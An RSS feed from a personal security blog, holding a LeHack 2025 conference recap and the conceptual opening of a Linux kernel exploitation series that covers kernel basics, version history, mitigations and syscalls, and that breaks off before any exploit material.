<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ProxyGeek Blog</title><link>https://Pr0xyG33k.github.io/</link><description>Author of Hugo FixIt, fond of experimenting, building tools, and writing. Sharing thoughts, experiences, and observations in front-end development.</description><generator>Hugo 0.150.0 &amp; FixIt v0.4.0-alpha</generator><language>en</language><managingEditor>1024@Pr0xyG33k.github.io (ProxyGeek)</managingEditor><webMaster>1024@Pr0xyG33k.github.io (ProxyGeek)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sun, 29 Jun 2025 05:24:44 +0200</lastBuildDate><atom:link href="https://Pr0xyG33k.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>LeHack Adventure 2025</title><link>https://Pr0xyG33k.github.io/posts/hack5/</link><pubDate>Fri, 27 Jun 2025 10:47:00 +0200</pubDate><author>1024@Pr0xyG33k.github.io (ProxyGeek)</author><guid>https://Pr0xyG33k.github.io/posts/hack5/</guid><category domain="https://Pr0xyG33k.github.io/categories/thoughts/">Thoughts</category><description>&lt;img src="https://Pr0xyG33k.github.io/posts/lehack/images/lehack.jpg" alt="featured image" referrerpolicy="no-referrer"&gt;&lt;p&gt;LeHack, one of the most renowned cybersecurity events in Europe, had been on my radar for a while. Known for its thrilling Capture The Flag (CTF) challenges, hands-on workshops, and the opportunity to meet some of the brightest minds in cybersecurity, I knew it would be a day to remember. From the moment I registered, I couldn’t wait to dive into the challenges that awaited me.&lt;/p&gt;
&lt;p&gt;Upon arriving, the buzz was palpable. People from all walks of cybersecurity—ethical hackers, penetration testers, and curious enthusiasts—gathered under one roof to push the limits of what we could learn and achieve. The event had a relaxed yet competitive vibe, and I was immediately pulled into the spirit of the community.&lt;/p&gt;
&lt;p&gt;The workshops were a perfect mix of theory and practice. One of the most interesting sessions was dedicated to &lt;strong&gt;IoT vulnerabilities&lt;/strong&gt;. We learned how easily common devices could be exploited if not properly secured. It was fascinating to see the instructor demonstrate in real time how an insecure device could be hacked—something I had only read about until then. The hands-on nature of these sessions made it feel less like a lecture and more like an immersion into real-world hacking.&lt;/p&gt;
&lt;p&gt;Of course, the &lt;strong&gt;CTF challenges&lt;/strong&gt; were one of the main attractions of LeHack. These competitions are a test of skill, speed, and creativity, where participants work in teams or alone to solve cybersecurity puzzles and hack into systems. I joined a team for a few challenges, and the adrenaline was incredible. The problems ranged from exploiting web vulnerabilities to decrypting encrypted messages. It was intense, but each solved challenge brought a rush of accomplishment.&lt;/p&gt;
&lt;p&gt;One of the most eye-opening moments was during the &lt;strong&gt;live hacking demonstrations&lt;/strong&gt;. Watching experts break into systems—demonstrating both the simplicity and complexity of cybersecurity flaws—was simultaneously awe-inspiring and sobering. It really hit home just how important it is to understand the vulnerabilities in systems we interact with every day.&lt;/p&gt;
&lt;p&gt;Networking was another major aspect of LeHack. Between the workshops and CTF breaks, I had the opportunity to chat with like-minded individuals who share a deep passion for cybersecurity. I met penetration testers, security researchers, and even students just beginning their journey into hacking. We exchanged knowledge, tips, and strategies, and I left with more resources and contacts than I ever expected.&lt;/p&gt;
&lt;p&gt;As the day came to a close, I felt a deep sense of fulfillment. LeHack had offered me not only an opportunity to test and improve my skills but also to connect with others in the community. The challenges, both technical and personal, had pushed me to learn more, think faster, and expand my cybersecurity knowledge in ways I never imagined.&lt;/p&gt;
&lt;p&gt;LeHack is an event that I highly recommend to anyone interested in cybersecurity—whether you’re just starting or are already an experienced professional. It’s an experience that goes beyond learning; it’s about pushing your limits, sharing knowledge, and becoming part of a vibrant community dedicated to cybersecurity.&lt;/p&gt;</description></item><item><title>Linux Kernel Exploitation Part 1</title><link>https://Pr0xyG33k.github.io/posts/kernel01/</link><pubDate>Sat, 14 Jun 2025 07:20:10 +0200</pubDate><author>1024@Pr0xyG33k.github.io (ProxyGeek)</author><guid>https://Pr0xyG33k.github.io/posts/kernel01/</guid><category domain="https://Pr0xyG33k.github.io/categories/guides/">Guides</category><description>&lt;h2 class="heading-element" id="about"&gt;&lt;span&gt;22 About&lt;/span&gt;
 &lt;a href="#about" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;In this first part of our Linux Kernel Exploitation series, we’ll lay down the essential knowledge needed to understand what the Linux kernel is, why it matters in security, and how vulnerabilities at this low level can impact entire systems.&lt;/p&gt;
&lt;p&gt;The Linux kernel is the core component that manages hardware, processes, memory, and system resources. It acts as the critical bridge between software applications and the physical machine. Because it runs with the highest privileges, any flaw or exploit within the kernel can give attackers full control over a system.&lt;/p&gt;
&lt;p&gt;Understanding kernel exploitation is a complex but rewarding journey. It requires a solid grasp of operating system internals, memory management, system calls, and security mechanisms.&lt;/p&gt;
&lt;div class="alert alert-caution"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M4.47.22A.749.749.0 015 0h6c.199.0.389.079.53.22l4.25 4.25c.141.14.22.331.22.53v6a.749.749.0 01-.22.53l-4.25 4.25A.749.749.0 0111 16H5a.749.749.0 01-.53-.22L.22 11.53A.749.749.0 010 11V5c0-.199.079-.389.22-.53zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5zM8 4a.75.75.0 01.75.75v3.5a.75.75.0 01-1.5.0v-3.5A.75.75.0 018 4zm0 8a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Caution&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Ethical Hacking Reminder&lt;/strong&gt;: Only perform kernel penetration tests on networks you own or have explicit permission to test. Unauthorized hacking is illegal and unethical.&lt;/p&gt;&lt;/div&gt;&lt;h2 class="heading-element" id="linux-kernel-exploitation"&gt;&lt;span&gt;23 Linux Kernel Exploitation&lt;/span&gt;
 &lt;a href="#linux-kernel-exploitation" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;In today’s computing landscape, the Linux kernel stands at the heart of countless systems — from personal computers and servers to cloud infrastructures and embedded devices. It manages critical functions like memory, processes, and hardware communication, silently powering the technology we rely on every day.&lt;/p&gt;
&lt;p&gt;But have you ever wondered how this complex piece of software actually works under the hood? What happens when vulnerabilities arise deep within the kernel, and how can attackers leverage them to gain control over entire systems?&lt;/p&gt;
&lt;p&gt;In this series, &lt;strong&gt;Linux Kernel Exploitation&lt;/strong&gt; we will delve into the core of the Linux operating system, uncovering how the kernel operates, how security mechanisms protect it, and how these protections can sometimes be bypassed. We’ll explore practical techniques for setting up a controlled lab environment, analyzing kernel behavior, and developing exploits—all while building a strong foundation of understanding.&lt;/p&gt;
&lt;h2 class="heading-element" id="what-is-the-linux-kernel"&gt;&lt;span&gt;24 What is the Linux Kernel?&lt;/span&gt;
 &lt;a href="#what-is-the-linux-kernel" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;The Linux kernel is the core component of the Linux operating system. It acts as a bridge between software applications and the physical hardware of a computer. Managing everything from CPU scheduling and memory allocation to device communication and system security, the kernel ensures that all parts of the system work together seamlessly.&lt;/p&gt;
&lt;p&gt;Because it operates with the highest level of privilege on the machine (ring 0), the kernel has complete control over the system’s resources and hardware. This central role makes it both incredibly powerful and a critical target for attackers.&lt;/p&gt;
&lt;h2 class="heading-element" id="key-concepts"&gt;&lt;span&gt;25 Key Concepts&lt;/span&gt;
 &lt;a href="#key-concepts" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;Before diving into exploitation, it’s essential to understand some key aspects of the Linux kernel. These foundational concepts help explain why the kernel is such a powerful — and attractive — target.&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Concept&lt;/th&gt;
 &lt;th&gt;Description&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;Privilege Levels&lt;/td&gt;
 &lt;td&gt;The kernel runs in &lt;strong&gt;ring 0&lt;/strong&gt;, with full access to hardware and memory. User applications run in &lt;strong&gt;ring 3&lt;/strong&gt;.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Monolithic Architecture&lt;/td&gt;
 &lt;td&gt;Linux uses a monolithic kernel, meaning it includes device drivers and modules within the kernel space.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Syscalls&lt;/td&gt;
 &lt;td&gt;System calls are the interface between user applications and the kernel (e.g., &lt;code&gt;read()&lt;/code&gt;, &lt;code&gt;write()&lt;/code&gt;).&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Kernel Space vs User Space&lt;/td&gt;
 &lt;td&gt;Separation between kernel memory and user memory helps maintain system stability and security.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Memory Management&lt;/td&gt;
 &lt;td&gt;The kernel controls virtual memory, paging, and physical memory allocation.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Modules&lt;/td&gt;
 &lt;td&gt;Kernel modules are pieces of code that can be dynamically loaded into the kernel (e.g., drivers).&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Scheduling&lt;/td&gt;
 &lt;td&gt;Responsible for task switching, process priorities, and CPU time allocation.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Filesystem Interface&lt;/td&gt;
 &lt;td&gt;The kernel manages filesystems and interacts with storage devices.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;These components are often the basis for real-world vulnerabilities, such as buffer overflows in device drivers or misconfigurations in syscall implementations.&lt;/p&gt;
&lt;h2 class="heading-element" id="evolution"&gt;&lt;span&gt;26 Evolution&lt;/span&gt;
 &lt;a href="#evolution" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;Linux has evolved dramatically since its first release in 1991. With each new version, features, performance, and security mechanisms have been improved — but so have the opportunities for discovering bugs.&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Year&lt;/th&gt;
 &lt;th&gt;Kernel Version&lt;/th&gt;
 &lt;th&gt;Key Features Introduced&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;1991&lt;/td&gt;
 &lt;td&gt;0.01&lt;/td&gt;
 &lt;td&gt;First public release by Linus Torvalds&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2001&lt;/td&gt;
 &lt;td&gt;2.4.x&lt;/td&gt;
 &lt;td&gt;Netfilter/iptables, improved USB support, enhanced memory management&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2003&lt;/td&gt;
 &lt;td&gt;2.6.x&lt;/td&gt;
 &lt;td&gt;Kernel preemption, Native POSIX threads, SELinux integration&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2011&lt;/td&gt;
 &lt;td&gt;3.x&lt;/td&gt;
 &lt;td&gt;Improved scalability, transparent huge pages, Btrfs improvements&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2015&lt;/td&gt;
 &lt;td&gt;4.x&lt;/td&gt;
 &lt;td&gt;Live patching, better NUMA support, perf events framework&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2020&lt;/td&gt;
 &lt;td&gt;5.x&lt;/td&gt;
 &lt;td&gt;WireGuard VPN integration, io_uring, improved hardware support&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;2024&lt;/td&gt;
 &lt;td&gt;6.x&lt;/td&gt;
 &lt;td&gt;Ongoing enhancements to Rust support, memory isolation features, more secure syscall filtering&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;Even as security mechanisms improve, new vulnerabilities continue to emerge — especially in device drivers and legacy code that hasn’t aged well.&lt;/p&gt;&lt;/div&gt;&lt;h2 class="heading-element" id="basic-terms"&gt;&lt;span&gt;27 Basic Terms&lt;/span&gt;
 &lt;a href="#basic-terms" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="security-mechanisms"&gt;&lt;span&gt;27.1 Security Mechanisms&lt;/span&gt;
 &lt;a href="#security-mechanisms" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;Modern Linux kernels implement multiple layers of defense to make exploitation harder. Understanding these is crucial to learning how attackers bypass them.&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Mechanism&lt;/th&gt;
 &lt;th&gt;Description&lt;/th&gt;
 &lt;th&gt;Mitigation Strength (0-10)&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;KASLR&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Randomizes kernel memory layout to prevent predictable memory addresses.&lt;/td&gt;
 &lt;td&gt;8&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;SMEP/SMAP&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Prevents kernel from executing or accessing user-space memory.&lt;/td&gt;
 &lt;td&gt;9&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Stack Canaries&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Detects and prevents stack buffer overflow attacks by checking integrity before function return.&lt;/td&gt;
 &lt;td&gt;7&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;NX (No-eXecute)&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Marks memory regions non-executable to prevent code injection attacks.&lt;/td&gt;
 &lt;td&gt;8&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Seccomp&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Restricts system calls allowed for processes, reducing attack surface.&lt;/td&gt;
 &lt;td&gt;6&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;AppArmor/SELinux&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Mandatory Access Control enforcing strict policies on program capabilities.&lt;/td&gt;
 &lt;td&gt;5&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;In the upcoming parts, we&amp;rsquo;ll study how these protections work — and how to defeat or bypass them when developing kernel exploits.&lt;/p&gt;
&lt;div class="echarts" style="width: 100%; height: 30rem;"&gt;&lt;/div&gt;&lt;template data-fmt="js" data-async="false"&gt;{ title: { text: &amp;#39;Kernel Defense Mechanisms Overview&amp;#39;, left: &amp;#39;center&amp;#39;, top: &amp;#39;2%&amp;#39; }, tooltip: { trigger: &amp;#39;item&amp;#39; }, radar: { indicator: [ { name: &amp;#39;KASLR&amp;#39;, max: 10 }, { name: &amp;#39;SMEP/SMAP&amp;#39;, max: 10 }, { name: &amp;#39;Stack Canaries&amp;#39;, max: 10 }, { name: &amp;#39;NX&amp;#39;, max: 10 }, { name: &amp;#39;Seccomp&amp;#39;, max: 10 }, { name: &amp;#39;AppArmor/SELinux&amp;#39;, max: 10 } ], radius: &amp;#39;60%&amp;#39;, splitNumber: 4 }, series: [{ name: &amp;#39;Kernel Defenses&amp;#39;, type: &amp;#39;radar&amp;#39;, data: [{ value: [8, 9, 7, 8, 6, 5], name: &amp;#39;Mitigation Strength&amp;#39;, lineStyle: { color: &amp;#39;#66CFFF&amp;#39; }, itemStyle: { color: &amp;#39;#66CFFF&amp;#39; }, areaStyle: { color: &amp;#39;rgba(102,207,255,0.3)&amp;#39; } }] }] }&lt;/template&gt;&lt;h3 class="heading-element" id="user-space-vs-kernel-space"&gt;&lt;span&gt;27.2 User Space vs Kernel Space&lt;/span&gt;
 &lt;a href="#user-space-vs-kernel-space" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;Linux divides system memory into two distinct areas to ensure security and stability:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;User Space&lt;/strong&gt;: This is where regular applications run—web browsers, editors, scripts, and so on. Programs in user space have limited access to system resources and cannot interact directly with hardware or critical kernel data. This isolation helps prevent accidental or malicious damage to the system.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Kernel Space&lt;/strong&gt;: This is where the Linux kernel operates, with full control over hardware, memory management, process scheduling, device drivers, and system security. Kernel code runs with the highest privileges (called &lt;strong&gt;ring 0&lt;/strong&gt;), allowing unrestricted access to all system resources.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This separation between user and kernel spaces is vital. When a user program needs to perform an operation requiring elevated privileges—like reading a file or sending network data—it must communicate with the kernel through a controlled interface called a &lt;strong&gt;system call&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;The Linux kernel runs in &lt;strong&gt;ring 0&lt;/strong&gt;, which is the most privileged CPU mode. All user programs run in &lt;strong&gt;ring 3&lt;/strong&gt;, with limited access.&lt;/p&gt;&lt;/div&gt;&lt;h3 class="heading-element" id="what-is-a-system-call"&gt;&lt;span&gt;27.3 What is a System Call?&lt;/span&gt;
 &lt;a href="#what-is-a-system-call" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;A &lt;strong&gt;system call (syscall)&lt;/strong&gt; is a controlled gateway for user-space programs to request services from the kernel. It acts as a safe bridge between restricted applications and the privileged kernel.&lt;/p&gt;
&lt;p&gt;When a syscall is invoked, the CPU switches from user mode (&lt;strong&gt;ring 3&lt;/strong&gt;) to kernel mode (&lt;strong&gt;ring 0&lt;/strong&gt;). The kernel then executes the requested operation—such as opening a file, allocating memory, or sending data—and finally returns control back to the user program.&lt;/p&gt;
&lt;p&gt;Common examples of syscalls include &lt;code&gt;read()&lt;/code&gt;, &lt;code&gt;write()&lt;/code&gt;, &lt;code&gt;open()&lt;/code&gt;, and &lt;code&gt;mmap()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This mechanism is critical because it maintains system stability and security while still allowing user applications to perform necessary tasks.&lt;/p&gt;
&lt;h3 class="heading-element" id="kernel-memory-layout"&gt;&lt;span&gt;27.4 Kernel Memory Layout&lt;/span&gt;
 &lt;a href="#kernel-memory-layout" class="heading-mark"&gt;
